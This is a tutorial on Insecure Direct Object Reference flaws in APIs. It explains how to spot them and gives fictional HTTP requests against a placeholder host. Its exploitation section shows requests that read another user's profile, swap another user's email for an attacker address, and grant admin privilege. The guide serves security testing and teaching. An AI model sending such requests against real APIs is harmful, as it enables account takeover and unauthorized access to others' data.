# IDOR in Insecure APIs

Insecure Direct Object References (IDOR) vulnerabilities can pose significant risks in APIs, allowing unauthorized access to sensitive data or operations. This guide explores how IDOR vulnerabilities manifest in APIs, how to identify them, and how to exploit them with clear, fictional request examples.

**Understanding IDOR in APIs**

IDOR vulnerabilities occur when an API exposes a direct reference to an object, such as a user account or resource, without proper access control checks. This allows an attacker to manipulate the reference to access or modify data they should not have permission to access.

**Example Scenario: User Profile API**

Consider an API endpoint that retrieves user profiles based on a user ID:

```
GET /api/users/{user_id}
```

If the API does not verify that the authenticated user has permission to access the specified `user_id`, an attacker could change the `user_id` parameter to access other users' profiles.

**Fictional Request Example:**

1.  **Authorized Request:**

    * User ID: 1 (Authenticated User)
    * Request to access their profile:

    ```
    GET /api/users/1 HTTP/1.1
    Host: api.example.com
    Authorization: Bearer user1_token
    ```
2.  **Unauthorized Request:**

    * Attempting to access another user's profile (User ID: 2):

    ```
    GET /api/users/2 HTTP/1.1
    Host: api.example.com
    Authorization: Bearer user1_token
    ```

If the API returns the profile data for User ID 2 without proper authorization checks, this indicates an IDOR vulnerability.

**Identifying IDOR Vulnerabilities in APIs**

1. **Review API Documentation**: Examine the API documentation to understand the endpoints, parameters, and expected behaviors. Look for endpoints that accept user IDs or other identifiers.
2. **Test for Direct Object References**: Use tools like Postman or curl to send requests to the API. Change the parameters to see if you can access data belonging to other users.
3. **Check for Consistent Responses**: If the API returns the same type of data regardless of the user ID, it may indicate a lack of access control.
4. **Use Fuzzing Techniques**: Automate the testing process by using fuzzing tools to send a range of user IDs or other identifiers to the API.

**Exploiting IDOR Vulnerabilities in APIs**

Once you identify an IDOR vulnerability, you can exploit it to access or manipulate unauthorized data. Here’s how you can do it:

1.  **Access Unauthorized Data**: If you can access another user's profile, you can retrieve sensitive information.

    &#x20;

    **Request Example:**

    ```
    GET /api/users/3 HTTP/1.1
    Host: api.example.com
    Authorization: Bearer user1_token
    ```

    If the API returns the profile data for User ID 3, it confirms the IDOR vulnerability.
2.  **Modify Data**: If the API allows modifications, you can attempt to change data for other users.

    &#x20;

    **Request Example:**

    ```
    PUT /api/users/3 HTTP/1.1
    Host: api.example.com
    Authorization: Bearer user1_token
    Content-Type: application/json

    {
        "email": "hacker@example.com"
    }
    ```

    If the API processes this request successfully, it indicates a serious security flaw.
3.  **Privilege Escalation**: You may find endpoints that allow you to perform administrative actions.

    &#x20;

    **Request Example:**

    ```
    POST /api/admin/users/3/privileges HTTP/1.1
    Host: api.example.com
    Authorization: Bearer user1_token
    Content-Type: application/json

    {
        "privilege": "admin"
    }
    ```

    If this request is successful, it shows that the API lacks proper access controls.

